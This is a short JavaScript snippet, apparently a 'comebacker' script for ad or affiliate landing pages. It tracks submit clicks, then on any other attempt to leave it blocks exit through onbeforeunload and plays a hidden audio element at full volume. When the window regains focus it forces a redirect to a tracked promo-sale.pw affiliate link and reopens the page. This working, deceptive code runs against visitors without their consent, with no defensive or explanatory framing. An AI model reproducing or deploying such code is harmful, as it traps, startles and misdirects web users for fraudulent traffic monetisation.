var lastLink = 'closed'; // last link

var inputs = document.querySelectorAll('input, button');
for(var i = 0; i < inputs.length; i++) {
	// to all links save last target
	var type = inputs[i].getAttribute('type');
	if (type == 'submit') {
		console.log(inputs[i]);
		inputs[i].addEventListener('click', function() { lastLink = 'submit'; }, false);
	}
}


document.addEventListener('DOMContentLoaded', function(e) {
	var audion = document.getElementById('xyz');
	audion.volume = 0.0;
});

window.onbeforeunload = unload;

function unload(e) {

	if (lastLink == 'closed') {
		lastLink = 'redirect';
		var audion = document.getElementById('xyz');
		audion.currentTime -= 999;
		audion.volume = 1.0;
		audion.play();
		return false;
	}
	if (lastLink == 'redirect') {
		window.close();
	}
}
window.addEventListener('focus', function(e) {
	let linkUrl = window.location.href;

	if (lastLink == 'redirect') {

		window.location = 'https://promo-sale.pw/click.php?key=un7osqjz2uw1k1bkioa6&clickid={clickid}&cost={bid}&t1={t1}&feed_id={feed_id}&utm_source=comebacker&utm_content={utm_content}&utm_term={utm_term}&utm_medium=Yaroslav&utm_campaign=3133_comeback_partnerka_campaign';
		window.open(linkUrl);

	}
});